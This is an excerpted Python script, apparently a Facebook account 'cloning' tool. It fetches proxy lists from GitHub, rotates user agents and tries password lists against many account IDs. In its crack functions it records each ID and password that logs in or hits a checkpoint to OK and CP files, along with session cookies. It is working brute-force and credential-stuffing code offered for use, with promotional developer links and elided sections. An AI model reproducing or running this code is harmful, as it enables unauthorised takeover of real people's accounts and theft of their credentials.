...
princp=[]
try:
    prox= requests.get('https://github.com/SHEIKH-SAJIB -404/PRO-MAX/blob/main/Prox.txt').text
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/SHEIKH-SAJIB -404/PRO-MAX/blob/main/Prox.txt').text
        ua=open('bbnew.txt','w')
...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/IBRAHIM .CYBER.143.MYMENSINGH.ER.KING')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
os.system("xdg-open https://https://www.facebook.com/SAJIB.Army00")
#------------------[ LOGO-LAKNAT ]-----------------#
logo =""" 
\033[1;93m╔═════════════════[\033[1;32m ADMIN - INFO \033[1;32m]═════════════╗
 \033[1;93m║\033[1;96m[✓] develop BY\33[0;m   : \033[1;96m CYBER-ARMY            \033[1;32m║
 \033[1;93m║\x1b[38;5;208m[✓] \x1b[38;5;208mFACEBOK      : \x1b[38;5;208m SAJIB VAU               \033[1;32m║
 \033[1;93m║\033[1;35m[✓] GITHUB       :  \033[1;35mCYBER-0033        \033[1;32m ║
 \033[1;93m║\033[1;38m[✓] TOOL STATUS  : \033[1;38m FILE CLONING \033[1;32m                   ║
 \033[1;93m║\033[1;32m[✓] TEAM         :\033[1;32    CYBER-ARMY \033[1;32m                ║
 \033[1;93m║\033[1;31m[✓] TOOL VIRSION :  \033[1;38m0.1                       \033[1;32m║
 \033[1;93m║᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈─╌❊❊╌──┈⊰᯽⊱\033[1;32m║
 \033[1;93m║[\033[1;97m•\033[1;91m]\033[1;32m PLZ SUPPORT ME BRO....                   \033[1;32m ║
 \033[1;93m║[\033[1;97m•\033[1;91m]\033[1;32m REQUEST MY FB ID SAJIB AHMED....         \033[1;32m ║
 \033[1;93m╚═════════════════[\033[1;93m S4JIB - 404 \033[1;32m]════════════╝"""
os.system('clear')
print(logo)
...
def menu():
    ...
    print('\033[0;97m================================================')
    IBRAHIM  = input('\x1b[1;92m[+] CHOOSE: ')
    if IBRAHIM  in ['111']:
        login()
        dump_massal()
    elif IBRAHIM  in ['1']:
        crack_file()
    elif IBRAHIM  in ['2','02']:
        os.system('xdg-open https://wa.me/+8801865874566')
        os.system("python nono.py")
    elif IBRAHIM  in ['3','03']:
        result()
    elif IBRAHIM  in ['0']:
...
def setting():
    ...
    print("\033[97;1m[\033[92;2m2\033[97;1m] METHOD 2 [\033[0;93mCp id Show\033[1;37m]")
    print('\033[0;91m==================')
    hc = input('\033[97;1m[\033[92;1m•\033[97;1m] CHOOSE : ')
    #os.system("xdg-open https://www.facebook.com/sajib40400")
    if hc in ['1','01']:
...
def passwrd():
    ...
    print(logo)
    print(f"\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mUSER NAME\033[1;91m :\033[1;96m "+uname)
    print("\033[97;1m[\033[92;1m•\033[97;1m] \033[10;92mTODAY'S DATE :\033[1;92m "+date)
    ...
    print("\033[97;1m[\033[92;1m+\033[97;1m] \033[10;92mCLONING SPEED SUPER FAST-!✅")
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[CYBER•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[IBRAHIM -Cp] {idf} • {pw}')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[SAJIB -M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•IBRAHIM -Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•IBRAHIM -Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  IBRAHIM ,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
